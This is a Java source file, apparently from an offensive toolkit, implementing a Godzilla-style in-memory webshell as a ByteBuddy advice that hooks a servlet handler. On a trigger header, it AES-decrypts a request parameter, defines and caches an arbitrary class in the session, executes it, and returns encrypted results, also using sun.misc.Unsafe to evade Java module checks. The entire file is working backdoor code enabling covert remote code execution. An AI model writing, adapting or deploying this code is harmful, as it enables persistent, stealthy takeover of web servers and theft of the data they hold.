package com.reajason.javaweb.memshell.springmvc.godzilla;

import net.bytebuddy.asm.Advice;

import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 */
public class GodzillaServletAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) Object request,
            @Advice.Argument(value = 1) Object response,
            @Advice.Origin Class<?> clazz
    ) {
        String key = "key";
        String pass = "pass";
        String md5 = "md5";
        String headerName = "headerName";
        String headerValue = "headerValue";
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, clazz, offset, module);
        } catch (Exception ignored) {
        }
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null
                    && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] data = null;
                Class<?> base64;
                try {
                    base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
                Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
                Class<?> keyClass = Class.forName("java.security.Key", true, Thread.currentThread().getContextClassLoader());
                Method cipherInitMethod = cipherClass.getMethod("init", int.class, keyClass);
                Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);

                Object cipher = cipherClass.getMethod("getInstance", String.class).invoke(cipherClass, "AES");
                Object secretKeySpec = secretKeySpecClass.getConstructor(byte[].class, String.class).newInstance(key.getBytes(), "AES");
                cipherInitMethod.invoke(cipher, 2, secretKeySpec);

                data = (byte[]) doFinalMethod.invoke(cipher, data);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
                if (sessionPayload == null) {
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", payload);
                } else {
                    request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) sessionPayload).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                    writer.write(md5.substring(0, 16));
                    f.toString();

                    cipherInitMethod.invoke(cipher, 1, secretKeySpec);
                    byte[] encryptBytes = (byte[]) doFinalMethod.invoke(cipher, arrOut.toByteArray());
                    String result = null;
                    try {
                        base64 = Class.forName("java.util.Base64");
                        Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                        result = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
                    } catch (Exception var6) {
                        base64 = Class.forName("sun.misc.BASE64Encoder");
                        Object encoder = base64.newInstance();
                        result = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
                    }
                    writer.write(result);
                    writer.write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}